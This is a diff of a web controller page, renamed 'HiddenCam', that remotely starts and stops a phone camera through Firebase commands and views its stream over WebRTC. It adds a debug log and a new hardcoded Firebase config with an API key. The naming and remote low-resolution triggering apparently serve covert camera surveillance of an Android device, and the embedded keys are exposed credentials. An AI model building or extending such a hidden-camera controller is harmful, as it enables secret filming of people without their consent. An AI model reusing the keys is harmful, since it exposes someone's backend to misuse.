@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>MyyApp - Live Stream Controller</title>
+    <title>HiddenCam - Live Stream</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
     <style>
@@ -15,7 +15,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -24,20 +24,19 @@
         }
 
         .container {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.05);
             backdrop-filter: blur(10px);
             border-radius: 24px;
             padding: 24px;
             max-width: 500px;
             width: 100%;
-            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
-            border: 1px solid rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
         h1 {
             text-align: center;
             color: white;
-            font-size: 24px;
+            font-size: 20px;
             margin-bottom: 20px;
             letter-spacing: 1px;
         }
@@ -83,13 +82,13 @@
 
         .status-text {
             color: white;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 500;
         }
 
         .stream-id {
             color: #888;
-            font-size: 12px;
+            font-size: 11px;
             margin-top: 8px;
             word-break: break-all;
         }
@@ -112,9 +111,9 @@
         }
 
         .placeholder {
-            color: #666;
+            color: #555;
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .controls {
@@ -126,7 +125,7 @@
         button {
             flex: 1;
             padding: 14px;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 600;
             border: none;
             border-radius: 40px;
@@ -161,7 +160,7 @@
 
         .resolution-title {
             color: white;
-            font-size: 14px;
+            font-size: 12px;
             margin-bottom: 10px;
             text-align: center;
         }
@@ -174,9 +173,9 @@
         .res-btn {
             flex: 1;
             padding: 10px;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.15);
             color: white;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .res-btn.active {
@@ -185,21 +184,28 @@
 
         .info {
             text-align: center;
-            color: #888;
-            font-size: 11px;
+            color: #555;
+            font-size: 10px;
             margin-top: 16px;
         }
 
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
+        .debug {
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            font-size: 9px;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 16px;
+            word-break: break-all;
+            font-family: monospace;
+            max-height: 150px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📹 MyyApp Live Stream</h1>
+        <h1>📹 HiddenCam Live</h1>
 
         <div class="status-card">
             <div class="status-header">
@@ -211,12 +217,12 @@
 
         <div class="video-container">
             <video id="video" autoplay playsinline muted></video>
-            <div class="placeholder" id="placeholder" style="display: none;">No stream available<br>Click START to begin</div>
+            <div class="placeholder" id="placeholder">No live stream<br>Click START on Web</div>
         </div>
 
         <div class="controls">
-            <button class="btn-start" id="startBtn">▶ START STREAM</button>
-            <button class="btn-stop" id="stopBtn">⏹ STOP STREAM</button>
+            <button class="btn-start" id="startBtn">▶ START</button>
+            <button class="btn-stop" id="stopBtn">⏹ STOP</button>
         </div>
 
         <div class="resolution-section">
@@ -228,29 +234,39 @@
         </div>
 
         <div class="info">
-            ⚡ WebRTC Real-time Streaming<br>
-            🟢 Green = Online | 🔴 Red = Offline
+            ⚡ WebRTC Real-time | 🟢 Online | 🔴 Offline
+        </div>
+
+        <div class="debug" id="debug">
+            Initializing...
         </div>
     </div>
 
     <script>
         // ============================================
-        // YOUR FIREBASE CONFIGURATION - DO NOT CHANGE
+        // FIREBASE CONFIG - HIDDENCAM PROJECT
         // ============================================
         const firebaseConfig = {
-            apiKey: "AIzaSyALXmXZg6UCfDFI1fU5TZ04oMP3aYgI_VU",
-            authDomain: "myapkk-405e8.firebaseapp.com",
-            databaseURL: "https://myapkk-405e8-default-rtdb.firebaseio.com",
-            projectId: "myapkk-405e8",
-            storageBucket: "myapkk-405e8.firebasestorage.app",
-            messagingSenderId: "1069468762166",
-            appId: "1:1069468762166:android:475b157fd53c94882f5897"
+            apiKey: "AIzaSyCcstwitNGxv5osXZ9AQ0a0PDn7j-MTv-0",
+            authDomain: "hiddencam-62e2d.firebaseapp.com",
+            databaseURL: "https://hiddencam-62e2d-default-rtdb.firebaseio.com",
+            projectId: "hiddencam-62e2d",
+            storageBucket: "hiddencam-62e2d.firebasestorage.app",
+            messagingSenderId: "931792860891",
+            appId: "1:931792860891:android:602d1099f876f4688d7efe"
         };
         // ============================================
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
+
+        const debugEl = document.getElementById('debug');
+        function log(msg) {
+            const time = new Date().toLocaleTimeString();
+            debugEl.innerHTML += `<br>[${time}] ${msg}`;
+            debugEl.scrollTop = debugEl.scrollHeight;
+            console.log(msg);
+        }
 
         let peerConnection = null;
         let currentStreamId = null;
@@ -258,32 +274,28 @@
         const configuration = {
             iceServers: [
                 { urls: "stun:stun.l.google.com:19302" },
-                { urls: "stun:stun1.l.google.com:19302" },
-                { urls: "stun:stun2.l.google.com:19302" }
+                { urls: "stun:stun1.l.google.com:19302" }
             ]
         };
 
-        // DOM Elements
-        const statusDot = document.getElementById('statusDot');
-        const statusTextEl = document.getElementById('statusText');
-        const streamIdTextEl = document.getElementById('streamIdText');
-        const video = document.getElementById('video');
-        const placeholder = document.getElementById('placeholder');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const res120p = document.getElementById('res120p');
-        const res240p = document.getElementById('res240p');
+        log('Firebase initialized');
+
+        // Firebase connection check
+        database.ref('.info/connected').on('value', (snap) => {
+            log(`Firebase connection: ${snap.val() ? 'Connected ✅' : 'Disconnected ❌'}`);
+        });
 
         // App Status Listener
         database.ref('appStatus/isOnline').on('value', (snapshot) => {
             const isOnline = snapshot.val();
+            log(`App status: ${isOnline ? 'ONLINE 🟢' : 'OFFLINE 🔴'}`);
             
             if(isOnline) {
-                statusDot.className = 'dot dot-green';
-                statusTextEl.textContent = '🟢 App Online';
+                document.getElementById('statusDot').className = 'dot dot-green';
+                document.getElementById('statusText').innerHTML = '🟢 App Online';
             } else {
-                statusDot.className = 'dot dot-red';
-                statusTextEl.textContent = '🔴 App Offline';
+                document.getElementById('statusDot').className = 'dot dot-red';
+                document.getElementById('statusText').innerHTML = '🔴 App Offline';
             }
         });
 
@@ -291,108 +303,128 @@
         database.ref('appStatus/streamId').on('value', (snapshot) => {
             currentStreamId = snapshot.val();
             if(currentStreamId) {
-                streamIdTextEl.textContent = `Stream ID: ${currentStreamId.substring(0, 8)}...`;
+                log(`Stream ID received: ${currentStreamId.substring(0, 8)}...`);
+                document.getElementById('streamIdText').innerHTML = `Stream ID: ${currentStreamId.substring(0, 8)}...`;
                 setupWebRTC();
             } else {
-                streamIdTextEl.textContent = 'Waiting for stream...';
+                log('Waiting for stream ID...');
+                document.getElementById('streamIdText').innerHTML = 'Waiting for stream...';
             }
         });
 
         async function setupWebRTC() {
-            if(!currentStreamId) return;
+            if(!currentStreamId) {
+                log('No stream ID, cannot setup WebRTC');
+                return;
+            }
             
             if(peerConnection) {
+                log('Closing existing peer connection');
                 peerConnection.close();
                 peerConnection = null;
             }
 
+            log('Creating PeerConnection...');
             peerConnection = new RTCPeerConnection(configuration);
 
             peerConnection.ontrack = (event) => {
+                log('✅✅✅ VIDEO TRACK RECEIVED! Stream is LIVE! ✅✅✅');
+                const video = document.getElementById('video');
                 video.srcObject = event.streams[0];
-                placeholder.style.display = 'none';
-                video.style.display = 'block';
+                document.getElementById('placeholder').style.display = 'none';
             };
 
             peerConnection.onicecandidate = (event) => {
                 if(event.candidate) {
+                    log(`ICE candidate sent to Android`);
                     database.ref(`webrtc/${currentStreamId}/candidates/web`).push(event.candidate);
                 }
             };
 
             peerConnection.onconnectionstatechange = () => {
+                log(`Connection state: ${peerConnection.connectionState}`);
                 if(peerConnection.connectionState === 'connected') {
-                    console.log('Connected!');
-                } else if(peerConnection.connectionState === 'disconnected') {
-                    video.srcObject = null;
-                    placeholder.style.display = 'flex';
-                    video.style.display = 'none';
+                    log('🎉🎉🎉 CONNECTED! Video should be visible! 🎉🎉🎉');
+                } else if(peerConnection.connectionState === 'failed') {
+                    log('❌ Connection failed! Check network');
                 }
             };
 
             try {
-                // Get offer from Android
-                const offerSnap = await database.ref(`webrtc/${currentStreamId}/offer`).get();
+                log('Waiting for offer from Android...');
+                const offerRef = database.ref(`webrtc/${currentStreamId}/offer`);
+                const offerSnap = await offerRef.get();
                 const offer = offerSnap.val();
-
+                
                 if(offer && offer.sdp) {
+                    log(`Offer received! Setting remote description...`);
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                    log('Remote description set, creating answer...');
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
-
+                    
+                    log('Sending answer to Android...');
                     await database.ref(`webrtc/${currentStreamId}/answer`).set({
                         sdp: answer.sdp,
                         type: answer.type
                     });
+                    log('✅ Answer sent successfully!');
+                } else {
+                    log('⚠️ No offer found in Firebase! Make sure Android app has START pressed.');
                 }
 
                 // Listen for ICE candidates from Android
                 database.ref(`webrtc/${currentStreamId}/candidates`).on('child_added', (snap) => {
                     const candidate = snap.val();
                     if(candidate && candidate.sdp && peerConnection) {
-                        peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.log(e));
+                        log(`ICE candidate received from Android`);
+                        peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => log(`ICE error: ${e}`));
                     }
                 });
 
             } catch(error) {
-                console.error('WebRTC Error:', error);
+                log(`❌ ERROR: ${error.message}`);
+                console.error(error);
             }
         }
 
         // START Button
-        startBtn.onclick = () => {
+        document.getElementById('startBtn').onclick = () => {
+            log('▶ START command sent to Android');
             database.ref('commands/stream').set('START');
         };
 
         // STOP Button
-        stopBtn.onclick = () => {
+        document.getElementById('stopBtn').onclick = () => {
+            log('⏹ STOP command sent to Android');
             database.ref('commands/stream').set('STOP');
             if(peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
+                const video = document.getElementById('video');
                 video.srcObject = null;
-                placeholder.style.display = 'flex';
-                video.style.display = 'none';
+                document.getElementById('placeholder').style.display = 'flex';
+                log('Peer connection closed');
             }
         };
 
         // 120p Resolution
-        res120p.onclick = () => {
+        document.getElementById('res120p').onclick = () => {
+            log('Resolution changed to 120p');
             database.ref('commands/resolution').set('120p');
-            res120p.classList.add('active');
-            res240p.classList.remove('active');
+            document.getElementById('res120p').classList.add('active');
+            document.getElementById('res240p').classList.remove('active');
         };
 
         // 240p Resolution
-        res240p.onclick = () => {
+        document.getElementById('res240p').onclick = () => {
+            log('Resolution changed to 240p');
             database.ref('commands/resolution').set('240p');
-            res240p.classList.add('active');
-            res120p.classList.remove('active');
+            document.getElementById('res240p').classList.add('active');
+            document.getElementById('res120p').classList.remove('active');
         };
 
-        // Initial placeholder
-        placeholder.style.display = 'flex';
-        video.style.display = 'none';
+        log('✅ Web app loaded. Waiting for Android app to connect...');
     </script>
 </body>
 </html>
